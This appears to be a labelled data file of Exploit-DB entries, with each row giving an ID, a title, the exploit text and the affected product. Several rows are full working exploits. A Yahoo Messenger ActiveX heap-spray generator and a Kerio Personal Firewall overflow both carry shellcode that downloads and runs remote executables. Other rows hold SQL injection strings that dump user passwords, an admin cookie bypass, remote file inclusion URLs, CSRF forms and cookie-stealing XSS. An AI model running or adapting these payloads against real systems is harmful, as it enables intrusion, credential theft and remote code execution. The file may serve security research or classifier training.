4053,"Yahoo! Messenger Webcam 8.1 - 'Ywcupl.dll' Download / Execute /*    Compile in LCC-win32 (Free!)   Download and exec any file you like!   Have Fun!   */   #include <stdio.h> #include <string.h> #include <stdlib.h> char *file = ""Click_here.html""; FILE *fp = NULL;     unsigned char sc[] = ""\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03"" ""\xF5\x33\xC9\x49\x41\xAD\x33\xDB\x36\x0F\xBE\x14\x28\x38\xF2\x74"" ""\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E"" ""\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03"" ""\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00\x43\x3A\x5C"" ""\x55\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40"" ""\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C"" ""\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC"" ""\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F"" ""\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB"" ""\x24\x53\xFF\xD0\x5D\xBF\x98\xFE\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83"" ""\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF"" ""\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF"";        char *url = NULL; unsigned char sc_2[] = ""\x00\x98"";    char * header = ""<html>\n"" ""<object classid=\""clsid:DCE2F8B1-A520-11D4-8FD0-00D0B7730277\"" id='viewme'></object>\n"" ""<body>\n"" ""<SCRIPT language=\""javascript\"">\n"" ""var shellcode = unescape(\""%u9090%u9090%u9090%u9090\"" + \n"";   char * footer = ""\n\n"" ""bigblock = unescape(\""%u9090%u9090\"");\n"" ""headersize = 20;\n"" ""slackspace = headersize+shellcode.length;\n"" ""while (bigblock.length<slackspace) bigblock+=bigblock;\n"" ""fillblock = bigblock.substring(0, slackspace);\n"" ""block = bigblock.substring(0, bigblock.length-slackspace);\n"" ""while(block.length+slackspace<0x40000) block = block+block+fillblock;\n"" ""memory = new Array();\n"" ""for (x=0; x<500; x++) memory[x] = block + shellcode;\n"" ""var buffer = '\\x0a';\n"" ""while (buffer.length < 5000) buffer+='\\x0a\\x0a\\x0a\\x0a';\n"" ""viewme.server = buffer;\n"" ""viewme.initialize();\n"" ""viewme.send();\n"";    char * trigger_1 = ""</script>\n"" ""</body>\n"" ""</html>\n"";    // print unicode shellcode void PrintPayLoad(char *lpBuff, int buffsize) { int i; for(i=0;i<buffsize;i+=2) { if((i%16)==0) { if(i!=0) { printf(""\""\n\""""); fprintf(fp, ""%s"", ""\"" +\n\""""); } else { printf(""\""""); fprintf(fp, ""%s"", ""\""""); } }   printf(""%%u%0.4x"",((unsigned short*)lpBuff)[i/2]);   fprintf(fp, ""%%u%0.4x"",((unsigned short*)lpBuff)[i/2]); }   printf(""\"";\n""); fprintf(fp, ""%s"", ""\"");\n"");    fflush(fp); }        void main(int argc, char **argv) { unsigned char buf[1024] = {0};   int sc_len = 0; int n;    if (argc < 2) {  printf(""\r\nYahoo 0day Ywcupl.dll ActiveX Exploit Download And Exec\n"");  printf(""link:http://research.eeye.com/html/advisories/upcoming/20070605.html\n"");  printf(""link:http://www.informationweek.com/news/showArticle.jhtml?articleID=199901856 \n"");  printf(""link:http://secunia.com/advisories/25547/\n"");  printf(""greetz to Jambalaya for helping with this code\n"");  printf(""\r\nUsage: %s <URL> [htmlfile]\n"", argv[0]);  printf(""\r\nE.g.: %s http://www.malwarehere.com/rootkit.exe exploit.html\r\n\n"", argv[0]);  printf(""=-Excepti0n-=\n""); exit(1); }   url = argv[1];    if( (!strstr(url, ""http://"") && !strstr(url, ""ftp://"")) || strlen(url) < 10) { printf(""[-] Invalid url. Must start with 'http://','ftp://'\n""); return; }   printf(""[+] download url:%s\n"", url);   if(argc >=3) file = argv[2]; printf(""[+] exploit file:%s\n"", file);   fp = fopen(file, ""w""); if(!fp) { printf(""[-] Open file error!\n""); return; }    //build Exploit HTML File fprintf(fp, ""%s"", header); fflush(fp);   memset(buf, 0, sizeof(buf)); sc_len = sizeof(sc)-1; memcpy(buf, sc, sc_len); memcpy(buf+sc_len, url, strlen(url));   sc_len += strlen(url);   memcpy(buf+sc_len, sc_2, 1); sc_len += 1;   PrintPayLoad((char *)buf, sc_len);   fprintf(fp, ""%s"", footer); fflush(fp);   fprintf(fp, ""%s"", trigger_1); fflush(fp);    printf(""[+] exploit write to %s success!\n"", file); }  // =-Excepti0n-=   // milw0rm.com [2007-06-08]",Yahoo! Messenger Webcam,1
27054,427BB 2.2 - Authentication Bypass source: https://www.securityfocus.com/bid/16178/info  427BB is prone to an authentication bypass vulnerability. This issue is due to a failure in the application to properly validate user-supplied data.  An attacker can exploit this issue to bypass the authentication mechanism and gain access to the affected application as an administrative user. This may facilitate a compromise of the underlying system; other attacks are also possible.  This issue affects version 2.2 and 2.2.1; other versions may also be vulnerable.   The following demonstrates cookie-data sufficient to exploit this issue: username=admin; authenticated=1; usertype=admin;,427BB,1
24808,"Microsoft Internet Explorer 6 - Search Pane URI Obfuscation source: https://www.securityfocus.com/bid/11851/info  A remote URI obfuscation vulnerability has been found in Internet Explorer's search pane functionality. This issue is due to a failure of the application to present the URI address of HTML and script code loaded into the search pane.  This issue may be leveraged by an attacker to display misleading information in the address bar of the browser to an unsuspecting user while loading a third party Web site in the search pane. This may allow an attacker to present web pages to users that seem to originate from a trusted location. This may facilitate phishing style attacks; other attacks may also be possible.  <form id=""foo"" action=""res://C:\WINDOWS\system32\shdoclc.dll/dnserror.htm#http://login.passport.net/uilogin.srf?id=malware.is.here"" method=""post""><   <input type=""submit"" value=""default value""> </form>  <a id=""fee"" href=""hotfemail.html"" target=""_search"">test</a>  <script>  var malware = screen.availHeight; window.moveTo(0, 0); window.resizeTo(500, malware); fee.click() // setTimeout(""fee.click();"",1);  setTimeout(""foo.submit();"",1);   </script>",Microsoft Internet Explorer,1
25389,"Multiple Vendor ICMP Message Handling - Denial of Service source: https://www.securityfocus.com/bid/13124/info    Multiple vendor implementations of TCP/IP Internet Control Message Protocol (ICMP) are reported prone to several denial-of-service attacks.    ICMP is employed by network nodes to determine certain automatic actions to take based on network failures reported by an ICMP message.    Reportedly, the RFC doesn't recommend security checks for ICMP error messages. As long as an ICMP message contains a valid source and destination IP address and port pair, it will be accepted for an associated connection.    The following individual attacks are reported:    - A blind connection-reset attack. This attack takes advantage of the specification that describes that on receiving a 'hard' ICMP error, the corresponding connection should be aborted. The Mitre ID CAN-2004-0790 is assigned to this issue.    A remote attacker may exploit this issue to terminate target TCP connections and deny service for legitimate users.    - An ICMP Source Quench attack. This attack takes advantage of the specification that a host must react to receive ICMP Source Quench messages by slowing transmission on the associated connection. The Mitre ID CAN-2004-0791 is assigned to this issue.    A remote attacker may exploit this issue to degrade the performance of TCP connections and partially deny service for legitimate users.    - An attack against ICMP PMTUD is reported to affect multiple vendors when they are configured to employ PMTUD. By sending a suitable forged ICMP message to a target host, an attacker may reduce the MTU for a given connection. The Mitre ID CAN-2004-1060 is assigned to this issue.    A remote attacker may exploit this issue to degrade the performance of TCP connections and partially deny service for legitimate users.    **Update: Microsoft platforms are also reported prone to these issues.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/25389.tar.gz",Multiple Vendor ICMP Message Handling,0
32807,"Joomla! / Mambo Component gigCalendar 1.0 - 'banddetails.php' SQL Injection source: https://www.securityfocus.com/bid/33859/info  The gigCalendar component for Joomla! and Mambo is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  gigCalendar 1.0 is vulnerable; other versions may also be affected.   http://www.example.com/path/index.php?option=com_gigcal&task=details&gigcal_bands_id=-1' UNION ALL SELECT 1,2,3,4,5,concat('username: ', username),concat('password: ', password),NULL,NULL,NULL,NULL,NULL,NULL from jos_users%23",Mambo Component gigCalendar,1
45855,"Rmedia SMS 1.0 - SQL Injection # Exploit Title: Rmedia SMS 1.0 - SQL Injection # Dork: N/A # Date: 2018-11-11 # Exploit Author: Ihsan Sencan # Vendor Homepage: http://sms.rmediaindia.com/ # Software Link: https://master.dl.sourceforge.net/project/rmediasms/rmedia_sms.rar # Version: 1.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:  # 1) # http://localhost/[PATH]/editgrp.php?gid=[SQL] #  GET /[PATH]/editgrp.php?gid=1%27%20AnD%20EXTRactvaLUE(156,CONcat((selECT+GrouP_conCAT(scHEma_NAme+SEparaTOR+0x3c62723e)+frOM+INFOrmaTION_ScheMA.SCHEmatA),(SelecT%20(Elt(156=156,1))),0x496873616e2053656e63616e))--%20Efe HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=31hgqp31e2ten1gk8gousnt0d3 Connection: keep-alive HTTP/1.1 200 OK Date: Sun, 11 Nov 2018 20:04:34 GMT Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30 X-Powered-By: PHP/5.6.30 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Content-Length: 234 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8",Rmedia SMS,1
3187,"ASP NEWS 3.0 - 'news_detail.asp' SQL Injection ******************************************************************************* # Title   :  ASP NEWS <= V3 (news_detail.asp) Remote SQL Injection Vulnerability # Author  :  ajann # Contact :  :( # S.Page  :  http://www.planetgraphic.de/  *******************************************************************************  [[SQL]]]---------------------------------------------------------  http://[target]/[path]//news_detail.asp?id=[SQL]  Example:  //news_detail.asp?id=-1%20union%20select%200,username,password,0,0,0%20from%20tblusers  [[/SQL]]  """""""""""""""""""""""""""""""""""""""""" # ajann,Turkey # ...  # Im not Hacker!  # milw0rm.com [2007-01-24]",ASP NEWS,1
28,"Kerio Personal Firewall 2.1.4 - Remote Code Execution /*  * Kerio Personal Firewall v2.1.4 remote code execution exploit   * Tested on Windows XP with SP1  *   * In order to exploit, for ease of mind, set the firewall to permit all traffic, or allow  * a connection to port 44334 from your testing unix shell ip.  *   * It is also possible to use UDP instead of TCP  *   * It works out very well, if not, hit a few times with a ret addr of 0x41414141 to make it crash   * AT THAT addr. Then use the original one, it will work. The one I used points to a 'call esp'  * inside the RPCRT4.DLL.  */  #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <errno.h> #include <string.h> #include <netdb.h> #include <sys/types.h> #include <netinet/in.h> #include <sys/socket.h>  #define PORT 44334 // the port client will be connecting to, default Kerio admin port  #define retpos 5272	 #define MAXDATASIZE 5277 // max number of bytes we can get, also size of buffer  // global vars  struct sockaddr_in their_addr; // connector's address information  char buf[MAXDATASIZE]; int numbytes;  unsigned char shellcode[] = ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""    ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""    ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""   ""\xEB\x30\x5F\xFC\x8B\xF7\x80""    ""\x3F\x08\x75\x03\x80\x37\x08\x47\x80\x3F\x01\x75\xF2\x8B\xE6\x33\xD2\xB2\x04\xC1""    ""\xE2\x08\x2B\xE2\x8B\xEC\x33\xD2\xB2\x03\xC1\xE2\x08\x2B\xE2\x54\x5A\xB2\x7C\x8B""    ""\xE2\xEB\x02\xEB\x57\x89\x75\xFC\x33\xC0\xB4\x40\xC1\xE0\x08\x89\x45\xF8\x8B\x40""    ""\x3C\x03\x45\xF8\x8D\x40\x7E\x8B\x40\x02\x03\x45\xF8\x8B\xF8\x8B\x7F\x0C\x03\x7D""    ""\xF8\x81\x3F\x4B\x45\x52\x4E\x74\x07\x83\xC0\x14\x8B\xF8\xEB\xEB\x50\x8B\xF8\x33""    ""\xC9\x33\xC0\xB1\x10\x8B\x17\x03\x55\xF8\x52\xEB\x03\x57\x8B\xD7\x80\x7A\x03\x80""    ""\x74\x16\x8B\x32\x03\x75\xF8\x83\xC6\x02\xEB\x02\xEB\x7E\x8B\x7D\xFC\x51\xF3\xA6""    ""\x59\x5F\x74\x06\x40\x83\xC7\x04\xEB\xDB\x5F\x8B\x7F\x10\x03\x7D\xF8\xC1\xE0\x02""    ""\x03\xF8\x8B\x07\x8B\x5D\xFC\x8D\x5B\x11\x53\xFF\xD0\x89\x45\xF4\x8B\x40\x3C\x03""    ""\x45\xF4\x8B\x70\x78\x03\x75\xF4\x8D\x76\x1C\xAD\x03\x45\xF4\x89\x45\xF0\xAD\x03""    ""\x45\xF4\x89\x45\xEC\xAD\x03\x45\xF4\x89\x45\xE8\x8B\x55\xEC\x8B\x75\xFC\x8D\x76""    ""\x1E\x33\xDB\x33\xC9\xB1\x0F\x8B\x3A\x03\x7D\xF4\x56\x51\xF3\xA6\x59\x5E\x74\x06""    ""\x43\x8D\x52\x04\xEB\xED\xD1\xE3\x8B\x75\xE8\x03\xF3\x33\xC9\x66\x8B\x0E\xEB\x02""    ""\xEB\x7D\xC1\xE1\x02\x03\x4D\xF0\x8B\x09\x03\x4D\xF4\x89\x4D\xE4\x8B\x5D\xFC\x8D""    ""\x5B\x2D\x33\xC9\xB1\x07\x8D\x7D\xE0\x53\x51\x53\x8B\x55\xF4\x52\x8B\x45\xE4\xFC""    ""\xFF\xD0\x59\x5B\xFD\xAB\x8D\x64\x24\xF8\x38\x2B\x74\x03\x43\xEB\xF9\x43\xE2\xE1""    ""\x8B\x45\xE0\x53\xFC\xFF\xD0\xFD\xAB\x33\xC9\xB1\x04\x8D\x5B\x0C\xFC\x53\x51\x53""    ""\x8B\x55\xC4\x52\x8B\x45\xE4\xFF\xD0\x59\x5B\xFD\xAB\x38\x2B\x74\x03\x43\xEB\xF9""    ""\x43\xE2\xE5\xFC\x33\xD2\xB6\x1F\xC1\xE2\x08\x52\x33\xD2\x52\x8B\x45\xD4\xFF\xD0""    ""\x89\x45\xB0\x33\xD2\xEB\x02\xEB\x77\x52\x52\x52\x52\x53\x8B\x45\xC0\xFF\xD0\x8D""    ""\x5B\x03\x89\x45\xAC\x33\xD2\x52\xB6\x80\xC1\xE2\x10\x52\x33\xD2\x52\x52\x8D\x7B""    ""\x09\x57\x50\x8B\x45\xBC\xFF\xD0\x89\x45\xA8\x8D\x55\xA0\x52\x33\xD2\xB6\x1F\xC1""    ""\xE2\x08\x52\x8B\x4D\xB0\x51\x50\x8B\x45\xB8\xFF\xD0\x8B\x4D\xA8\x51\x8B\x45\xB4""    ""\xFF\xD0\x8B\x4D\xAC\x51\x8B\x45\xB4\xFF\xD0\x33\xD2\x52\x53\x8B\x45\xDC\xFF\xD0""    ""\x89\x45\xA4\x8B\x7D\xA0\x57\x8B\x55\xB0\x52\x50\x8B\x45\xD8\xFF\xD0\x8B\x55\xA4""    ""\x52\x8B\x45\xD0\xFF\xD0\xEB\x02\xEB\x12\x33\xD2\x90\x52\x53\x8B\x45\xCC\xFF\xD0""    ""\x33\xD2\x52\x8B\x45\xC8\xFF\xD0\xE8\xE6\xFD\xFF\xFF\x47\x65\x74\x4D\x6F\x64\x75""    ""\x6C\x65\x48\x61\x6E\x64\x6C\x65\x41\x08\x6B\x65\x72\x6E\x65\x6C\x33\x32\x2E\x64""    ""\x6C\x6C\x08\x47\x65\x74\x50\x72\x6F\x63\x41\x64\x64\x72\x65\x73\x73\x08\x4C\x6F""    ""\x61\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x08\x5F\x6C\x63\x72\x65\x61\x74\x08\x5F""    ""\x6C\x77\x72\x69\x74\x65\x08\x47\x6C\x6F\x62\x61\x6C\x41\x6C\x6C\x6F\x63\x08\x5F""    ""\x6C\x63\x6C\x6F\x73\x65\x08\x57\x69\x6E\x45\x78\x65\x63\x08\x45\x78\x69\x74\x50""    ""\x72\x6F\x63\x65\x73\x73\x08\x77\x69\x6E\x69\x6E\x65\x74\x2E\x64\x6C\x6C\x08\x49""    ""\x6E\x74\x65\x72\x6E\x65\x74\x4F\x70\x65\x6E\x41\x08\x49\x6E\x74\x65\x72\x6E\x65""    ""\x74\x4F\x70\x65\x6E\x55\x72\x6C\x41\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x52\x65""    ""\x61\x64\x46\x69\x6C\x65\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x43\x6C\x6F\x73\x65""    ""\x48\x61\x6E\x64\x6C\x65\x08\x4E\x53\x08\x6E\x73\x73\x63\x2E\x65\x78\x65\x08""   ""http://reversedhell.net/hackyou.exe""   ""\x08\x01""; // download + exec from the net ; donno who wrote this sc      //change the url to whatever, this one pops up an innofensive message box  // end of global vars  int suck(int sock,int n) // painfull function to get rid of the painfull Kerio protocol { 	int i=0,j=0,k,a=0,b=0,c=0,d=0;  	while (i<n) 	{  		if ((numbytes=recv(sock, buf, n, 0)) == -1) {             	perror(""recv"");             	exit(1); 	       }          	if (j) i+=(numbytes-1); // ya i know i know :D                 	else i+=numbytes;          	for (k=0;k<numbytes;k++) {         					if (k % 10 == 0) fprintf(stderr,""\n"");         					if (buf[k]==0) fprintf(stderr,""    0 "");         					else fprintf(stderr,"" %4.0d "",buf[k]);         				     }	           	fprintf(stderr,""    * "");         	j++;         	d=buf[numbytes];         	c=buf[numbytes-1];         	b=buf[numbytes-2];         	a=buf[numbytes-3];         	if ((i>200) && (a==0x1) && (b==0x0) && (c==0x1) && (d==0x0)) break;         }         fprintf(stderr,""\n"");         return i; }       int main(int argc, char *argv[])     {         int sockfd, i,j;           struct hostent *he;           if (argc != 2) {             fprintf(stderr,""usage: ./%s hostname\n"",argv[0]);             exit(1);         }          if ((he=gethostbyname(argv[1])) == NULL) {  // get the host info              perror(""gethostbyname"");             exit(1);         }          if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) { // prepare a socket for connecting             perror(""socket"");             exit(1);         }          their_addr.sin_family = AF_INET;    // host byte order          their_addr.sin_port = htons(PORT);  // short, network byte order          their_addr.sin_addr = *((struct in_addr *)he->h_addr);         memset(&(their_addr.sin_zero), '\0', 8);  // zero the rest of the struct           if (connect(sockfd, (struct sockaddr *)&their_addr,sizeof(struct sockaddr)) == -1) {             perror(""connect"");             exit(1);         }                    fprintf(stderr,""shell len = %d\n"",strlen(shellcode)); 	 fprintf(stderr,""Connected to firewall.\n""); 	 memset(buf,0x0,sizeof(buf)); 	 fprintf(stderr,""Sucking buffer..\n"");         suck(sockfd,266);         fprintf(stderr,""\nBuffer sucked by black hole..\n"");     	 memset(buf,0x0,sizeof(buf));     	 fprintf(stderr,""-------------------------------------------------\n"");     	 fprintf(stderr,""                 - BANNER -   \n"");     	 fprintf(stderr,""-------------------------------------------------\n"");     	 sleep(1); 	 fprintf(stderr,""coded by Burebista (aanton@reversedhell.net)\n""); 	 fprintf(stderr,""           released on - 5 Apr 2003 -\n""); 	  	 sleep(2);     	 fprintf(stderr,""-------------------------------------------------\n""); 	 memset(buf,0x90,MAXDATASIZE); // set nops all over 	  	 // prepares call up to beginning of buffer 32 bit=5 bytes 	 buf[MAXDATASIZE-1]='\xff'; // 	 buf[MAXDATASIZE-2]='\xff'; // call -1150 	 buf[MAXDATASIZE-3]='\xee'; // 	 buf[MAXDATASIZE-4]='\xab'; // 	 buf[MAXDATASIZE-5]='\xe8'; // 	  						 	 j=0;                    // insert the shellcode in buf at 900 	 for (i=900;j<strlen(shellcode);i++) buf[i]=shellcode[j++];  	  	 // prepares the new return address (on XPSP1 it is CALL ESP in RPCRT4.DLL) 	 	 buf[retpos-1]='\x78'; 	 buf[retpos-2]='\x07'; 	 buf[retpos-3]='\x06'; 	 buf[retpos-4]='\x90'; 	  	 // this prepares packet header with negative length  	  	 buf[0]=0; 	 buf[1]=0; 	 buf[2]=0x14; 	 buf[3]=0xffffff9c; // negative, -100. firewall will prepare 	                          // buf of that size. signed integers hit again 	/*          The 4th byte in the packet is the size of what the firewall will be expecting to receive         right ahead. If we send longer buffer then what we told the firewall to expect, it will be         simply truncated and nothing cool will happen. The problem is Kerio never thought we could         tell it something that stupid like we are going to send -100 bytes, it is like expecting a         client to buy -20 books from your library, which is an absurdity. There is no checking to         make sure the user input is valid. Again, invalid trusted user input. What they should have         done is either to use the 4th byte inside a modulus, to make sure it is always positive,         either lamingly check if it is negative, and if true, stop processing the inputted data.                  	             What's so funny?                    	*/ 	  	 if ((send(sockfd, buf,sizeof(buf),0)) == -1 ) { // PASARAN!  		perror(""send""); 		exit(1); 	 } 	 fprintf(stderr,""..pasaran...\n""); 	 fprintf(stderr,"":D Done!\n""); 	          close(sockfd);        }   // milw0rm.com [2003-05-08]",Kerio Personal Firewall,1
1817,"Docebo 3.0.3 - Multiple Remote File Inclusions ################ DEVIL TEAM THE BEST POLISH TEAM ################# #Docebo 3.0.3/DoceboCMS,DoceboKms,DoceboLms,DoceboCore,DoceboScs - Remote File Include Vulnerabilities #Find by Kacper (Rahim). #Greetings For ALL DEVIL TEAM members, Special DragonHeart :*** #Contact: kacper1964@yahoo.pl   or   http://www.devilteam.yum.pl #################################################################### #Docebo Site: http://www.docebocms.org ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ In All scripts: [code] require_once($GLOBALS['where_framework'].'/lib/lib.permission.php'); require_once($GLOBALS['where_framework'].'/lib/lib.pagewriter.php'); require_once($GLOBALS['where_framework'].'/lib/lib.lang.php'); require_once($GLOBALS['where_framework'].'/lib/lib.template.php'); require_once($GLOBALS['where_framework'].'/lib/lib.mimetype.php'); [/code]  #DoceboCMS:  http://www.site.com/docebocms/lib/lib.simplesel.php?GLOBALS[where_framework]=[evil_code]  #DoceboKms:  http://www.site.com/doceboKms/modules/documents/lib.filelist.php?GLOBALS[where_framework]=[evil_code]  http://www.site.com/doceboKms/modules/documents/tree.documents.php?GLOBALS[where_framework]=[evil_code]  #DoceboLms:  http://www.site.com/doceboLms/lib/lib.repo.php?GLOBALS[where_framework]=[evil_code]  #DoceboCore:  http://www.site.com/doceboCore/lib/lib.php?GLOBALS[where_framework]=[evil_code]  #DoceboScs:  http://www.site.com/doceboScs/lib/lib.teleskill.php?GLOBALS[where_scs]=[evil_code]  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #The End ;-) #Pozdro Dla wszystkich o których zapomnia.em ;-)  # milw0rm.com [2006-05-23]",Docebo,1
18592,"4Images Image Gallery Management System - Cross-Site Request Forgery ######################################################################################################## # Title: 4images - Image Gallery Management System - [CSRF] Change mail user or admin    # Author: Dmar al3noOoz    # Mail : wafee_s[at]hotmail.com   # Name : 4images - Image Gallery Management System  # dork : Google Dork: ""4images - Image Gallery Management System""  # Software Link : http://www.4homepages.de  # Version: 1.7.7   ##############################################  Exploit  ##############################################    <html> <body onload=""javascript:fireForms()""> <script language=""JavaScript""> var pauses = new Array( ""1062"" );  function pausecomp(millis) {     var date = new Date();     var curDate = null;      do { curDate = new Date(); }     while(curDate-date < millis); }  function fireForms() {     var count = 1;     var i=0;          for(i=0; i<count; i++)     {         document.forms[i].submit();                  pausecomp(pauses[i]);     } }      </script> <form method=""POST"" name=""form0"" action=""http://www.XXXXXX.com/patch/member.php""> <input type=""hidden"" name=""user_email"" value=""you mail""/> <input type=""hidden"" name=""user_email2"" value=""you mail""/> <input type=""hidden"" name=""action"" value=""updateprofile""/> </form> </body> </html>    -=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=-Greetz-=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=- -=- v4-team.com - Evil-Cod3r - dmar hacker - dr.Dmar - Dmaral7roOob - Ra7aLAlgnob - Mr.law - Alkeasr20 - Mr.black - Cyber-CrysTaL    -=- -=-                                          Team 19vr - RootAl3noz - all Friend - exploit-db.com                                    -=- -=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-",4Images Image Gallery Management System,1
25061,"NullSoft Winamp 5.0.x - Variant 'IN_CDDA.dll' Remote Buffer Overflow (PoC) source: https://www.securityfocus.com/bid/12381/info  A remote buffer overflow vulnerability affects the IN_CDDA.dll library of Nullsoft's Winamp. This issue is due to a failure of the application to properly validate the length of user-supplied strings prior to copying them into finite process buffers. It should be noted that this issue is not related to the issue outlined in BID 11730 (Nullsoft Winamp IN_CDDA.dll Remote Buffer Overflow Vulnerability).  This issue will facilitate remote exploitation as an attacker may distribute malicious play-list files and entice unsuspecting users to process them with the affected application.  #EXTM3U #EXTINF:5,DJ Mike Llama - Llama Whippin' Intro cda://AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHnT _IJJJ‹å3ÿWƒìÆEøcÆEùmÆEúdÆEû.ÆEüeÆEýxÆEþe¸D€¿wP]øSÿÐ",(Nullsoft Winamp,1
15981,"LifeType 1.2.10 - HTTP Referer Persistent Cross-Site Scripting # Exploit Title: lifetype 1.2.10 http referer XSS # Date: 11-1-2010 # Author: Saif El-Sherei # Software Link: http://lifetype.net/page/downloads # Version: 1.2.10 # Tested on: firefox 3.0.15  failure to sanitize the http referer header in index.php results in a cross site scripting attack against admins or any user able to view blog statistics. an attacker could use an intercepting proxy or manual requests to perform this attack, the referer is recorder into the database when visiting any section in the index.php (albums, archives,etc....), a user with only the privilege  to login could perform this attack, the issue affects all browsers.  POC:  referer HTTP header: http://127.0.0.1/lifetype-1.2.10/index.php?op=Template&blogId=1&show=archives""><script>alert('XSS')</script>  timeline:  vulnerability dicovered: 11-1-2011 vendor notified: 11-1-2011",LifeType,1
30993,Snitz Forums 2000 3.4.5/3.4.6 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/27162/info  Snitz Forums 2000 is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Snitz Forums 2000 2.4.05 and 3.4.06 are vulnerable; other versions may also be affected.   http://www.example.com/Forums/setup.asp?RC=3&MAIL=%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E http://www.example.com/login.asp?target=%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E,Snitz Forums,1
